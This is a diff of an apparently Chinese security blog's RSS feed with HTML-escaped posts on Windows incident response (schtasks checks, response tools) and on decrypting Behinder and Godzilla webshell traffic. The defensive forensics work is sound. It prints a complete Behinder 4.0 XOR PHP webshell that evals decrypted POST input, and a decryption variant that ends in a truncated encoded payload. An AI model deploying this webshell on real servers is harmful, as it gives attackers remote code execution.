+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;266&#34;
+		data-flex-basis=&#34;639px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;34计划任务排查&#34;&gt;3.4.计划任务排查
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;schtasks&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tn&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Mirage&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tr&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;C:\Windows\system32\cmd.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;minute&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mo&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//创建计划任务&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;schtasks&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tn&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Mirage&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//查找名称为test的计划任务并格式化输出&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/21.png&#34;
+	width=&#34;1373&#34;
+	height=&#34;612&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/21_hu_b4802dce34a6878b.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/21_hu_6791fbb0a32de3da.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;224&#34;
+		data-flex-basis=&#34;538px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;使用图形化界面搜索计划任务&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/22.png&#34;
+	width=&#34;2077&#34;
+	height=&#34;716&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/22_hu_7113b99b905c7f1c.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/22_hu_6bb7b54369c6d3e9.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;290&#34;
+		data-flex-basis=&#34;696px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;4windows应急响应工具&#34;&gt;&lt;strong&gt;4.Windows应急响应工具&lt;/strong&gt;
+&lt;/h2&gt;&lt;h3 id=&#34;41火绒安全分析工具&#34;&gt;4.1.火绒安全分析工具
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/23.png&#34;
+	width=&#34;2560&#34;
+	height=&#34;1287&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/23_hu_de34699b8ae1f958.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/23_hu_c3376792e5b12b82.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;198&#34;
+		data-flex-basis=&#34;477px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>某挖矿应急响应靶场WP</title>
         <link>https://lserein.github.io/p/%E6%9F%90%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BAwp/</link>
         <pubDate>Tue, 24 Jun 2025 15:15:15 +0800</pubDate>
@@ -2306,16 +3037,148 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;先看请求头：天蝎每次连接都会在请求头中添加一个XFF字段，并且值是随机的，Content-Type类型为application/octet-stream，连接为长连接，请求体和返回内容都是AES加密的，无明显特征&lt;/strong&gt;&lt;/p&gt;
 &lt;h2 id=&#34;6冰蝎流量解密&#34;&gt;6.冰蝎流量解密
-&lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/RbWRJ2SF1PQg6tvNNCU80g&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://mp.weixin.qq.com/s/RbWRJ2SF1PQg6tvNNCU80g&lt;/a&gt;&lt;/p&gt;
+&lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/intbjw/webshell-decryptor&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;strong&gt;https://github.com/intbjw/webshell-decryptor&lt;/strong&gt;&lt;/a&gt;  &lt;strong&gt;一款开源解密冰蝎流量工具&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;冰蝎流量解密最重要的一步是需要知道冰蝎的key，如果不知道key那么是不可能解密成功的。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;获取key的几个方法：&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;默认key为rebeyond md5的前16位&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;如果能拿到攻击者上传的webshell文件，可以查看源代码进行分析获取key值&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;看冰蝎后门是怎么传来到，如果是通过文件上传漏洞上传上来的，可以从全流量中获取上传数据包拿到key值&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//冰蝎4.0的异或php木马
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;@error_reporting(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Decrypt($data)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;err&#34;&gt;$key=&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;e45e329feb5d925b&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;err&#34;&gt;$bs=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;base64_&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;decode&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;err&#34;&gt;$after=$bs($data.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;err&#34;&gt;for($i=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;;$i&amp;lt;strlen($after);$i++)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    	&lt;span class=&#34;err&#34;&gt;$after[$i]&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;$after[$i]^$key[$i+1&amp;amp;15];&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;err&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;$after;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$post=Decrypt(file_get_contents(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;php://input&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;@eval($post);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//只需要将上传的加密脚本下载下来，将流量包内容放到下面Content中
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;@error_reporting(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Decrypt($data)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;err&#34;&gt;$key=&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;e45e329feb5d925b&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;err&#34;&gt;$bs=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;base64_&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;decode&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;err&#34;&gt;$after=$bs($data.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;err&#34;&gt;for($i=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;;$i&amp;lt;strlen($after);$i++)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    	&lt;span class=&#34;err&#34;&gt;$after[$i]&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;$after[$i]^$key[$i+1&amp;amp;15];&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;err&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;$after;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//$post=Decrypt(file_get_contents(&amp;#34;php://input&amp;#34;));
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$Content=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;VUYWVkBNGgAUVAgRUFQRAAIBOldXWgkBBx1DaHVjGwZZDBxrAXMKBiUMHV11WRc/TVISeGZKKCYFBS9jXGMXPAdnFVEADQE/UGNUbABzDz9ie1VQW14NBlFnHXJqRiwmXXQCenF4DQYYcANpYXcSPAYMEFdbXggBOmcJdWZSDCl3UQtqX0oQKVJZLG1ZDDE3Z1YWeXp3VgYLXlN9Y1oFLHd0Anl6dBEsJgUDWGV7FAdabAp5AF0PBBtWF3MBY1I/XQVRf0sALDdSADRsWWAMKXdnH35hUlEhM1oDcHF0BQRjbAp5enQRLCYFXXBxZxgBfHwVVkUJLSwhdANwcXQFLHd3HGlqa1cGDwEDc3p4FSpDBS56cXgBLCoECFt6ew4AQwUuenF4ASwhdANwcXcbP2xnVFBfDQEENXsSW1xsDS8GUQxSS1oVL1FjVGNbBVYpTQwvYQIMNjAJYAp1cWcYAXx8FXxFCS0sIXQDcHoFLCZaBStwX2NXBw97VFhlDBcscwQNUmUNCS8lexBjcUIJBnNzVVJxUigmDEYqelt0BSx3dyRQAG9WPVFnFFtlYwQHc1kRUmpoCSghXlN9Y1oFLHd0AmJ1VQgHDwwdY2QMUwYGYxxrAH8PB1F/VHJ2cBIqQwUuenF4ASwndxRbX1kEBgZjVXhxXRI8Ol0CY2pdDjwHY1VSZQATPVFnFFtlYAwpd3QSeGZKKCYLdANwcXQJBlljH1dlQVYsJgUDYGp/GzxsXgp4ZkooJgt0A3BxdAkwc3MOV3dJEywmBQNodVkXBGIMC2lqaAkvUGcUWgBzCwdzYwNpXG8TPFFnFFsAABgvTV5Sd2NWASwhdANYZWwFLndwAmllCBEBKl4Lc3R3Cj98Zy5RW1IWLCpGKnpbdAUsd3QCenF4AS8kdwxjemcpB110XHp6ex8/NVECWl9jFQdzcw9pYV4IKVNGF3B0BRApTVYWenFaFS8bQgNzdHcKP3xnLlFbUlEhM1oDcHF0BSx3dAJ6cWs3PDVnVGpfAQU1Z3cJVnp7FQdQZwhycVYRL01CAnl0ew4/KmcvW1teVSFlWgJ6cXgBLCF0A3BxZzM8Y2dVYF8NATUxdwxaXH8KAGIMEWpqeAkvUWcdWGUFDCl3dA5mdX8NASdFEXJmRiwmXXQCenF7XywlYxdaAGAFAEMFLnpxeAEsIXQDcHF0CTBzcw5Xd0kTLCYFA2Bqfxs8bF4KeGZKKCYLdANwcXdbIWVaAnpxeAEvJXgDaWF0CTwGBA58RQktLCF0A3B1WQ8sd10iYmdBMjcxdAxpZgUFBgdnHFB1ABwuKntUWlxnFAdzDFZpanAJMCddNWECDDYuZ0ICeQFdFgcLVhRyYXdVIWVaAnpxeAEsIXQDcHFnCCxwBQJ5dXQBKQt0DXB2fEkvXnMGUVtwUSEzWgNwcXQFA2UFLnpxeAEsIWcvXWVjMDdxfyx6dgkBL1BZHmEAewoHc00Nal9BCi8YRip6W3QFLHd0DmJcYww/MXRdcHFREgdYDA1QXHMOADFWU31jWgUsd3QCUmVgAS4hZy9dZWMwN3F/LHhxXRwAOntUY2UFDC5ndw1RX2gBLDF0D2hcbwg/Z1ILUAFVHAElYxBzS0IFL3J3DWl6ay0HC14UcHpGLCZddAJ6cXgBLCF0A1sAfwQGB2cNUFxoCS42Rip6W3QFLHd0AnpxeAEGUVkeXXVjFi53Zw94ZkooJgt0A3BxdAUsd3QCeXVNPjYOVgNpYXcUPFgMC2lqawA8UAwRXXVjFwF8eAp4ZkooJgt0A3BxdAUsd3QCUQBzAD81AA9hAHsRP2NzEHhxUlEhM1oDcHF0BQNndwlRencKLCVZCXBxUgk2WmMJZmdrJTYhUgpaen8UPAUME1B1bxMvG14DYGUACSx3cAJ5d3NUPFBgC3MBdxsHBnsDUQF7CgcLVhdwcWczPGNnVWBfDRYuMXdTfWNaBSx3dAJ6cXgBLCFnC2BlAAkHc2ACY2F7EQYPDA5hAAwVP2MBCnl1dBUsJXMdWl9zVy51BS56cXgBLCF0A3BxdAUsd3QCampzHzw6Xgt9Y1oFLHd0AnpxeAEsIXQDcHF0BSx3dAJ5AXsWBiVgCnVzBSksd3QCenF4ASwhdANwcXQFLHd0AnpxXR8vFQUvcHF0BSx3dAJ6cXgBLCF0A3JhQiwmXXQCenF4ASwhdANwcXQFLHNzHFBff1MuIwUvcHF0BSx3dAJ6cXgBLCF0A3BxdAUsd1ESUmp7Ci8bQip6W3QFLHd0AnpxeAEsIXQDcHF0BSx3dAtXS1ooJgt0A3BxdAUsd3QCenF4ASwhXhd9Y1oFLHd0AnpxeAEsIXQDcHF3CgZafw1WYV4oJgt0A3BxdAUsd3QCenF4ASwhdANwcXQMBnNZEmlhWhUhM1oDcHF0BSx3dAJ6cXgBLCF0A3BxdAUvB1YLd2NWASwhdANwcXQFLHd0AnpxeBYhM1oDcHF0BSx3dAJ6cVIVLCFnE1hqdw4GTV5Sd2NWASwhdANwcXQFLHdnF2UCST4sJgUDbV5jLzFwRitwW3gBLCF0A3BxdAUBBl0VUXVsAS4hcANjX2MUP11SDlB1VRE/OnsGdGQFEi5nd1J3Y1YBLCF0A3BxdAUsd3QCenF4DQRTUS9vS3QXNWd3CFBfbw4/IVIPWnVZFT9sewd+ZAkVLCZwE3RYZBIqQwUuenF4ASwhdANwcXdbIWVaAnpxeAEsIXQDcHd3FQZZDA9rAHcVB1F7CHJxZw08YwAOUXVsFioVBS9wcXQFLHwFAmllQRw/MXcUY1t0DS9xRVRpZH8jNAlSC3MBdwoGB3tVUnpzVy8bXgNgZQAJLHdwAnl3c1Q8UGALcwF3CgYHe1VSenNXLxtCA3N0dwo/fGcuUVtSFiwqRip6W3QFLHd0AnpxeAEHUH8CWgFnCgZaZAp4ZkooJgt0A3BxdAUsd3QCUHV/HAZRZwtaXGANL3N4FXxFCS0sIXQDcHF0BSx3dA5SA10tMxt0XXB1DAs9BlEJV3QADAdQAFRjZQBSBk1SFXxFCS0sIXQDcHF0BSx3dxNqXgAKBw9nAmAATQ48YwEKeGZKKCYLdANwcXdbLHNjFlAAbAEENWwDcnFnKQFjYzdhd3MvLiFRHlh1YxEHcgwJVnVvDC8bXgNgZQAJLHdwAnl3c1Q8UGALcwF7DT9jTRZrAG9SPzV4CnVxdAkwc3MOV3dJEy4xXgNcRQUpLHd0AnpxeAEsIXQPWANRKTNNdFx6encJPzVNF2EAY1Y/Y3gKeXV0FioVBS9wcXQFLHwFAmllQRw/MXcUY1t0DS9xRVRpZH8jNAlSC3MAY1Y/Y3gLeGF7DgcPZANwYXQJNFpvD2lhXgg/Ol0IYEtWESx3ZzRqZWtWNg8BFHJhd1UhZVoCenF4ASwhdANwcWcQMwRFPXp2CQE8On8dYGpeDS5gRitwW3gBLCF0A3BxdAU/bF0JakteDTwbQgNzdUE6NlhWFXxFCS0sIXQDcHF0BSx3dA5SA10tMxt0XXB1RRQEYwEKagBRHy4mcBNyYUIFL3NBPWBeWhYsIQEDYABdGy5wcBJ4ZkooJgt0A3Bxd1